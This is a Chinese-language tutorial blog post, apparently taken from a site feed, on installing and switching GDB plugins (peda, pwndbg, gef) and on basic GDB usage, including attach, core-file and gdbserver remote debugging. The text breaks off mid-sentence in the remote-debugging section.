        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB的基础和使用</title>
      <link href="/posts/c9687d57.html"/>
      <url>/posts/c9687d57.html</url>
      
        <content type="html"><![CDATA[<h1 id="GDB-的安装与配置"><a href="#GDB-的安装与配置" class="headerlink" title="GDB 的安装与配置"></a>GDB 的安装与配置</h1><h2 id="安装-gdb"><a href="#安装-gdb" class="headerlink" title="安装 gdb"></a>安装 gdb</h2><blockquote><p>如果系统已经预装好了就不要再安装了</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-gdb-multiarch"><a href="#安装-gdb-multiarch" class="headerlink" title="安装 gdb-multiarch"></a>安装 gdb-multiarch</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gdb-multiarch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="安装-GDB-插件"><a href="#安装-GDB-插件" class="headerlink" title="安装 GDB 插件"></a>安装 GDB 插件</h1><blockquote><p>这些类似的插件其实大同小异，安装插件只是因为原生的 GDB 没有高亮、观察寄存器和堆栈信息不方便</p><p><strong>注意：这几个插件并不兼容，但可以通过更改 <code>.gdbinit</code> 文件来切换使用，当你要使用某一个插件的时候，将 <code>.gdbinit</code> 文件中其他两个插件注释掉</strong></p><p><mark>在后面会介绍怎么使用脚本来进行切换 gdb 插件，就不需要手动去注释了</mark></p></blockquote><p>我这里统一将 GDB 插件安装在 <code>/opt/gdb_plugins/</code> 目录下</p><hr><p><mark>如果是 Ubuntu 16.04 这样的老版本安装 GDB 插件，请参照《Ubuntu16.04虚拟机PWN环境搭建》一文</mark></p><hr><h2 id="安装-peda"><a href="#安装-peda" class="headerlink" title="安装 peda"></a>安装 peda</h2><p>安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/longld/peda.git /opt/gdb_plugins/peda<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/peda/peda.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-pwndbg"><a href="#安装-pwndbg" class="headerlink" title="安装 pwndbg"></a>安装 pwndbg</h2><blockquote><p><code>pwndbg</code> 与 <code>Pwngdb</code> 需要一起搭配使用</p></blockquote><p>安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/pwndbg/pwndbg /opt/gdb_plugins/pwndbg<span class="token builtin class-name">cd</span> /opt/gdb_plugins/pwndbg<span class="token function">sudo</span> ./setup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="安装-Pwngdb"><a href="#安装-Pwngdb" class="headerlink" title="安装 Pwngdb"></a>安装 Pwngdb</h3><p>安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/scwuaptx/Pwngdb.git /opt/gdb_plugins/Pwngdb<span class="token builtin class-name">cd</span> /opt/gdb_plugins/Pwngdb<span class="token function">sudo</span> <span class="token function">cp</span> .gdbinit ~/<span class="token function">sudo</span> <span class="token function">vim</span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>~/.gdbinit</code> 的第二行插入：（记得插入在 <code>source /opt/gdb_plugins/Pwngdb/pwngdb.py</code> 这一句的前面）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果 pwndbg 的路径不是 <code>/opt/gdb_plugins/pwndbg</code>，请按照自己的实际路径修改</p><hr><h3 id="配置-pwndbg-分屏调试"><a href="#配置-pwndbg-分屏调试" class="headerlink" title="配置 pwndbg 分屏调试"></a>配置 pwndbg 分屏调试</h3><blockquote><p>由于 pwndbg 输出的信息较多，经常在一页上看不全，需要上下翻找，眼花缭乱</p><p>我们可以设置 pwndbg 分屏调试，一边屏幕输入命令，一边屏幕查看输出信息，提高效率</p></blockquote><h4 id="方法一：修改-gdbinit"><a href="#方法一：修改-gdbinit" class="headerlink" title="方法一：修改 gdbinit"></a>方法一：修改 gdbinit</h4><p>配置很简单，先后打开两个终端</p><p>假设先打开的一个终端用于开启 gdb 调试并输入调试命令，后打开的一个终端用于输出调试信息</p><p>在两个终端分别输入 <code>tty</code>，先打开的终端为 <code>/dev/pts/19</code>，后打开的为 <code>/dev/pts/20</code> <em>（以自己的实际输出信息为主）</em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A82.png" alt="GDB的基础和使用2.png"></p><p>修改 <code>~/.gdbinit</code> 中的内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>~/.gdbinit</code> 末尾加入一句：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> context-output xxx<span class="token comment"># 这里的 xxx 就是用于输出调试信息的分屏，我这里是：/dev/pts/20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><mark>注意：如果你开了多个终端，就设置为实际想要用于输出调试信息的分屏</mark></p><p>保存退出</p><p>在先打开的终端中开启 gdb 并输入调试命令，在后打开的终端中即可输出调试信息</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A83.png" alt="GDB的基础和使用3.png"></p><p>然后我们将屏幕调整一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A84.png" alt="GDB的基础和使用4.png"></p><blockquote><p>设置分屏后，如果只开启一个终端，使用 gdb 可能会遇到如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Exception occurred: context: <span class="token punctuation">[</span>Errno <span class="token number">13</span><span class="token punctuation">]</span> 权限不够: <span class="token string">'/dev/pts/20'</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>class <span class="token string">'PermissionError'</span><span class="token operator">></span><span class="token punctuation">)</span>  For <span class="token function">more</span> info invoke <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-verbose on<span class="token variable">`</span></span> and rerun the <span class="token builtin class-name">command</span>  or debug it by yourself with <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">set</span> exception-debugger on<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再开启一个终端即可解决 （新开启的终端需为 &#x2F;dev&#x2F;pts&#x2F;20）</p></blockquote><hr><h4 id="方法二：gdb-临时设置"><a href="#方法二：gdb-临时设置" class="headerlink" title="方法二：gdb 临时设置"></a>方法二：gdb 临时设置</h4><p>由于有时候新开启的终端并不是我们在 <code>~/.gdbinit</code> 中设置的那个终端，频繁更改 <code>~/.gdbinit</code> 中的内容未免太过麻烦</p><p>所以，我们也可以不在 <code>~/.gdbinit</code> 中设置，而是先在一个终端中启动 gdb 调试，然后再另开一个新的终端，使用 <code>tty</code> 查看新的终端的分屏信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tty</span><span class="token comment"># 假设输出为：/dev/pts/18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在 gdb 中直接设置输出调试信息的分屏： （以自己上一步实际的分屏信息为主）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> context-output /dev/pts/18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以避免新打开的终端与我们在 <code>~/.gdbinit</code> 中设置的终端不一致的问题</p><hr><h2 id="安装-gef"><a href="#安装-gef" class="headerlink" title="安装 gef"></a>安装 gef</h2><p>安装方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/hugsy/gef /opt/gdb_plugins/gef<span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"source /opt/gdb_plugins/gef/gef.py"</span> <span class="token operator">>></span> ~/.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h2><ul><li>自用的 <code>~/.gdbinit</code> 文件内容示例：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># source /opt/gdb_plugins/peda/peda.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/pwndbg/gdbinit.py<span class="token comment"># source /opt/gdb_plugins/gef/gef.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/pwngdb.py<span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/angelheap/gdbinit.pydefine hook-runpython<span class="token function">import</span> angelheapangelheap.init_angelheap<span class="token punctuation">(</span><span class="token punctuation">)</span>endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>终端输入 <code>gdb</code>：</p><ol><li>当启用 <strong>peda</strong> 时，会出现：<code>gdb-peda$ </code></li><li>当启用 <strong>pwndbg</strong> 时，会出现：<code>pwndbg&gt; </code></li><li>当启用 <strong>gef</strong> 时，会出现：<code>gef➤ </code></li></ol><p>如果验证出现上述输出内容，<mark>并且在输出内容之前没有任何报错提示</mark>，则说明安装成功</p><p>如果没有安装成功，输入 <code>gdb</code> 会显示默认的：<code>(gdb) </code></p></blockquote><hr><h1 id="脚本自动切换-GDB-插件"><a href="#脚本自动切换-GDB-插件" class="headerlink" title="脚本自动切换 GDB 插件"></a>脚本自动切换 GDB 插件</h1><blockquote><p>这个脚本可以自动定位 <code>~/.gdbinit</code> 文件中 <code>&quot;# this place is controled by user&#39;s shell&quot;</code> 这一句所在的位置，并随着用户对于插件的选择，自动更改 <code>~/.gdbinit</code> 文件里的内容，更改的内容会放在 <code>&quot;# this place is controled by user&#39;s shell&quot;</code> 这一句的上一行</p><p><strong>如果你安装 gdb 插件是按照我的教程来的，那下面的东西你可以不需要做任何改动，否则可能会有所修改</strong></p></blockquote><ol><li><strong>这一步非常重要！！！</strong></li></ol><p>首先，你需要自己手动在 <code>~/.gdbinit</code> 文件的<u>第二行</u>加上 <code>&quot;# this place is controled by user&#39;s shell&quot;</code> 这一句</p><p>然后把原本 <code>~/.gdbinit</code> 文件中的内容<u>全部</u>放到 <code>&quot;# this place is controled by user&#39;s shell&quot;</code> 这一句后面</p><p><strong>记得把插件全部注释掉</strong></p><p>修改好的 <code>~/.gdbinit</code> 文件类似于我这样：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>第一行空出来，什么都不写<span class="token punctuation">)</span><span class="token comment"># this place is controled by user's shell</span><span class="token comment"># source /opt/gdb_plugins/peda/peda.py</span><span class="token comment"># source /opt/gdb_plugins/pwndbg/gdbinit.py</span><span class="token comment"># source /opt/gdb_plugins/gef/gef.py</span><span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/pwngdb.py<span class="token builtin class-name">source</span> /opt/gdb_plugins/Pwngdb/angelheap/gdbinit.pydefine hook-runpython<span class="token function">import</span> angelheapangelheap.init_angelheap<span class="token punctuation">(</span><span class="token punctuation">)</span>endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>新建一个名为 gdb.sh 的文件：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> gdb.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并将下面的脚本内容添加进去</p><p>可能改动的地方都做了标注，<strong>如果你的插件是按照我的教程来安装的，那就直接用就行了</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">function</span> <span class="token function-name function">Mode_change</span> <span class="token punctuation">&#123;</span>    <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token variable">$1</span>    <span class="token assign-left variable">gdbinitfile</span><span class="token operator">=~</span>/.gdbinit    <span class="token comment"># 这个路径按照你的实际情况修改</span>    <span class="token assign-left variable">peda</span><span class="token operator">=</span><span class="token string">"source /opt/gdb_plugins/peda/peda.py"</span>   <span class="token comment"># 这个路径按照你的实际情况修改</span>    <span class="token assign-left variable">gef</span><span class="token operator">=</span><span class="token string">"source /opt/gdb_plugins/gef/gef.py"</span>   <span class="token comment"># 这个路径按照你的实际情况修改</span>    <span class="token assign-left variable">pwndbg</span><span class="token operator">=</span><span class="token string">"source /opt/gdb_plugins/pwndbg/gdbinit.py"</span>   <span class="token comment"># 这个路径按照你的实际情况修改</span>    <span class="token assign-left variable">sign</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> $gdbinitfile <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-n</span> <span class="token string">"# this place is controled by user's shell"</span><span class="token variable">)</span></span>        <span class="token comment"># 此处上面的查找内容要和你自己的保持一致</span>    <span class="token assign-left variable">pattern</span><span class="token operator">=</span><span class="token string">":# this place is controled by user's shell"</span>    <span class="token assign-left variable">number</span><span class="token operator">=</span><span class="token variable">$&#123;sign<span class="token operator">%</span>$pattern&#125;</span>    <span class="token assign-left variable">location</span><span class="token operator">=</span>$<span class="token punctuation">[</span>number-1<span class="token punctuation">]</span>    <span class="token assign-left variable">parameter_add</span><span class="token operator">=</span><span class="token variable">$&#123;location&#125;</span>i    <span class="token assign-left variable">parameter_del</span><span class="token operator">=</span><span class="token variable">$&#123;location&#125;</span>d    <span class="token assign-left variable">message</span><span class="token operator">=</span><span class="token string">"TEST"</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$name</span> <span class="token parameter variable">-eq</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"<span class="token variable">$parameter_del</span>"</span> <span class="token variable">$gdbinitfile</span>        <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"<span class="token variable">$parameter_add</span> <span class="token variable">$pwndbg</span>"</span> <span class="token variable">$gdbinitfile</span>        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Please enjoy the pwndbg!<span class="token entity" title="\n">\n</span>"</span>    <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token variable">$name</span> <span class="token parameter variable">-eq</span> <span class="token string">"2"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"<span class="token variable">$parameter_del</span>"</span> <span class="token variable">$gdbinitfile</span>        <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"<span class="token variable">$parameter_add</span> <span class="token variable">$peda</span>"</span> <span class="token variable">$gdbinitfile</span>        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Please enjoy the peda!<span class="token entity" title="\n">\n</span>"</span>    <span class="token keyword">else</span>        <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"<span class="token variable">$parameter_del</span>"</span> <span class="token variable">$gdbinitfile</span>        <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"<span class="token variable">$parameter_add</span> <span class="token variable">$gef</span>"</span> <span class="token variable">$gdbinitfile</span>        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Please enjoy the gef!<span class="token entity" title="\n">\n</span>"</span>    <span class="token keyword">fi</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Please choose one mode of GDB?<span class="token entity" title="\n">\n</span>1.pwndbg    2.peda    3.gef"</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"Input your choice:"</span> num<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$num</span> <span class="token parameter variable">-eq</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    Mode_change <span class="token variable">$num</span><span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token variable">$num</span> <span class="token parameter variable">-eq</span> <span class="token string">"2"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    Mode_change <span class="token variable">$num</span><span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token variable">$num</span> <span class="token parameter variable">-eq</span> <span class="token string">"3"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    Mode_change <span class="token variable">$num</span><span class="token keyword">else</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Error!<span class="token entity" title="\n">\n</span>Pleasse input right number!"</span><span class="token keyword">fi</span>gdb <span class="token variable">$1</span> <span class="token variable">$2</span> <span class="token variable">$3</span> <span class="token variable">$4</span> <span class="token variable">$5</span> <span class="token variable">$6</span> <span class="token variable">$7</span> <span class="token variable">$8</span> <span class="token variable">$9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>把 gdb.sh 文件移到 <code>/usr/bin/</code> 目录下，类似于 Windows 的环境变量，在这个目录下可以通过 cmd 直接调用：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> ./gdb.sh /usr/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>给 gdb.sh 文件增加执行权限：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/bin/<span class="token function">sudo</span> <span class="token function">chmod</span> a+x gdb.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="5"><li>以后再打开 gdb 的时候，直接输入 <code>gdb.sh</code> 即可：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A81.png" alt="GDB的基础和使用1.png"></p><blockquote><p>我的脚本也是根据 <a href="https://www.jianshu.com/p/94a71af2022a">GDB插件控制——切换pwndbg,peda,gef - 简书 (jianshu.com)</a> 修改的</p><p>所以，如果你是按照我的教程来安装的，那就没什么问题<br>但如果你不是，那可能需要对脚本做一些修改，可以自己去参考一下上面的简书链接</p></blockquote><hr><h1 id="GDB-的使用方法"><a href="#GDB-的使用方法" class="headerlink" title="GDB 的使用方法"></a>GDB 的使用方法</h1><blockquote><p><strong>首先要保证使用 gcc 编译时加上参数 -g 生成调试信息</strong></p></blockquote><p>一些可缩写的等价指令：</p><table><thead><tr><th align="left">操作</th><th align="left">完整指令</th><th align="left">简洁指令</th></tr></thead><tbody><tr><td align="left">下断点</td><td align="left">break</td><td align="left">b</td></tr><tr><td align="left">下临时断点</td><td align="left">tbreak</td><td align="left">tb</td></tr><tr><td align="left">为已设断点添加条件</td><td align="left">condition</td><td align="left">cond</td></tr><tr><td align="left">删除断点</td><td align="left">detele</td><td align="left">d</td></tr><tr><td align="left">运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令</td><td align="left">run</td><td align="left">r</td></tr><tr><td align="left">单步执行，跳过子函数</td><td align="left">next</td><td align="left">n</td></tr><tr><td align="left">单步执行，进入子函数</td><td align="left">step</td><td align="left">s</td></tr><tr><td align="left">直接执行到下一断点或程序结束</td><td align="left">continue</td><td align="left">c</td></tr><tr><td align="left">查看信息</td><td align="left">info</td><td align="left">i</td></tr><tr><td align="left">列出程序源码，一次可列出 10 行</td><td align="left">list</td><td align="left">l</td></tr><tr><td align="left">打印变量的值</td><td align="left">print</td><td align="left">p</td></tr><tr><td align="left">显示当前函数调用栈的完整信息，包括调用函数和它们的参数</td><td align="left">backtrace</td><td align="left">bt</td></tr><tr><td align="left">查看栈帧中某一帧的信息</td><td align="left">frame</td><td align="left">f</td></tr><tr><td align="left">设置监视点</td><td align="left">watch</td><td align="left">wat</td></tr><tr><td align="left">设置要自动显示的变量、表达式或函数的值，可以在调试过程中持续监视特定变量的值</td><td align="left">display</td><td align="left">disp</td></tr><tr><td align="left">运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息</td><td align="left">finish</td><td align="left">fi</td></tr><tr><td align="left">执行程序，直到达到指定行号，可用于退出循环体，而不必逐行执行</td><td align="left">until</td><td align="left">u</td></tr><tr><td align="left">退出调试</td><td align="left">quit</td><td align="left">q</td></tr><tr><td align="left">反汇编</td><td align="left">disassemble</td><td align="left">disass</td></tr></tbody></table><p>其他指令：</p><table><thead><tr><th align="left">操作</th><th align="left">完整指令</th></tr></thead><tbody><tr><td align="left">启动程序并在 main() 函数处停止（等价于先 b main 再 r）</td><td align="left">start</td></tr><tr><td align="left">清除断点，与 delete 类似，但只需要行号，无需断点编号</td><td align="left">clear</td></tr><tr><td align="left">禁用断点</td><td align="left">disable</td></tr><tr><td align="left">启用断点</td><td align="left">enable</td></tr><tr><td align="left">终止调试</td><td align="left">kill</td></tr><tr><td align="left">将当前程序执行流跳转到指定行或地址</td><td align="left">jump</td></tr><tr><td align="left">查看当前栈帧上面的栈帧</td><td align="left">up</td></tr><tr><td align="left">查看当前栈帧下面的栈帧</td><td align="left">down</td></tr><tr><td align="left">查看当前目录</td><td align="left">pwd</td></tr><tr><td align="left">修改数值</td><td align="left">set</td></tr></tbody></table><p><em>gdb 中什么都不输入，直接回车，表示：重复上一步的指令</em></p><hr><h2 id="启动-GDB-调试"><a href="#启动-GDB-调试" class="headerlink" title="启动 GDB 调试"></a>启动 GDB 调试</h2><blockquote><p>启动 GDB 可添加的参数：（可选）<br><code>--args</code> ：指定启动参数<br><code>--quiet</code> ：不打印 gdb 版本信息<br><code>--directory=DIR</code>：指定源码的搜索路径</p><p>示例：<code>gdb --args --quiet --directory=DIR ./testApp a b c</code></p></blockquote><hr><h3 id="一般程序调试与附加调试"><a href="#一般程序调试与附加调试" class="headerlink" title="一般程序调试与附加调试"></a>一般程序调试与附加调试</h3><ul><li>调试可执行文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>调试正在运行的进程（附加调试）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb attach 进程pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他指令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> gdb 文件名 进程pid<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> gdb <span class="token parameter variable">-p</span> 进程pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以先进入 GDB，再调试进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> attach 进程pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>快速获取进程号 pid：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pidof 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过 Pwntools 附加 GDB 调试：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"程序路径"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="core-文件调试"><a href="#core-文件调试" class="headerlink" title="core 文件调试"></a>core 文件调试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb 出现崩溃的文件名 core文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序在运行之后发生了错误，会生成一个 core 文件，通过调试 core 文件，可以分析程序崩溃的原因</p><p>其中，core 文件名大多数是 <code>core.进程pid</code> 的形式</p><ul><li>设置 core 文件的大小，直接在命令终端输入命令即可，大小可作为开关使用</li></ul><p><strong>Linux 系统默认 core 文件的大小限制为 0，即产生 segmentation-fault 段错误时不会生成 core 文件</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-c</span> <span class="token number">0</span>          <span class="token comment"># 将 core 文件大小设置为 0，此时将不生成 core 文件</span><span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-c</span> <span class="token number">2</span>          <span class="token comment"># 将 core 文件大小设置为 2 KB，自动生成 core 文件，文件大小达到 2 KB 时发生截断</span><span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-c</span> unlimited  <span class="token comment"># 将 core 文件大小设置为无上限，自动生成 core 文件，文件大小不添加特殊限制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>设置 core 文件生成目录、命名规则</li></ul><p>修改 <code>/proc/sys/kernel/core_pattern</code> 文件内容可以设置 core 文件名包含的信息内容和目录（目录必须存在），注意使用 <code>echo</code> 或 <code>sysctl</code> 命令，vim 可能不能成功编辑内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/home/core/core_%p_%t"</span> <span class="token operator">></span> core_pattern   <span class="token comment"># 将 core 文件统一生成到 /home/core 目录下，产生的文件名为 core_进程pid_时间</span><span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token string">"kernel.core_pattern=core_%p_%t"</span> <span class="token operator">></span>/dev/null   <span class="token comment"># 文件生成到默认目录（进程目录），文件名格式为 core_进程pid_时间</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>信息内容参数包括：</p><table><thead><tr><th align="left">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>%p</code></td><td align="left">进程 pid</td></tr><tr><td align="left"><code>%u</code></td><td align="left">当前 uid</td></tr><tr><td align="left"><code>%g</code></td><td align="left">当前 gid</td></tr><tr><td align="left"><code>%s</code></td><td align="left">导致产生 core 的信号</td></tr><tr><td align="left"><code>%t</code></td><td align="left">core 文件生成时的 unix 时间</td></tr><tr><td align="left"><code>%h</code></td><td align="left">主机名</td></tr><tr><td align="left"><code>%e</code></td><td align="left">命令名</td></tr></tbody></table><ul><li>设置文件名中以进程 PID 作为扩展名</li></ul><p>修改 <code>/proc/sys/kernel/core_uses_pid</code> 文件，文件内容为 1，添加进程 PID 作为文件扩展，为 0 不添加</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"1"</span> <span class="token operator">></span> /proc/sys/kernel/core_uses_pid  <span class="token comment"># 以进程 PID 作为 core 文件扩展名，生成的文件名称类似于 core.13125</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="远程-GDB-调试"><a href="#远程-GDB-调试" class="headerlink" title="远程 GDB 调试"></a>远程 GDB 调试</h3><ul><li>在被调试主机上，启动 gdbserver：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdbserver IP地址:端口号 文件名 传递参数<span class="token punctuation">(</span>可选<span class="token punctuation">)</span>gdbserver IP地址:端口号 <span class="token parameter variable">--attach</span> 进程pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>端口号可以任意指定，一般选择大于 1024 的端口号（尽量避免端口号冲突）</strong></p><ul><li>在调试主机上，通过 gdb 连接：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb 文件名<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> target remote IP地址:端口号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>如果无法连接，可能是被调试主机的防火墙问题</li></ul><p>查看 gdbserver 端口是否被防火墙过滤（在调试主机上运行，端口号为 gdbserver 